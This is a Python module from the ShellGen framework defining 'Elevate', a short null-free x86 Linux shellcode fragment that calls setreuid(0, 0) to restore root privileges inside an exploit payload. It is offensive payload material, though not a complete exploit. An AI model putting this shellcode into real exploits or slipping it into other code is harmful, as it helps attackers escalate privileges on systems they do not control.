#!/usr/bin/env python

###############################################################################
## Recover root privileges by calling setreuid(0, 0) on Linux/x86            ##
## Shellcode for ShellGen                                                    ##
###############################################################################

# Copyright (c) 2012 Mario Vilas
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

__all__ = ["Elevate"]

from shellgen import Static

class Elevate (Static):
    provides  = ["root"]
    encoding  = ["nullfree"]

    bytes = (
        "\x6A\x46"      # push 0x46
        "\x58"          # pop eax
        "\x31\xDB"      # xor ebx, ebx
        "\x31\xC9"      # xor ecx, ecx
        "\xCD\x80"      # int 0x80
    )
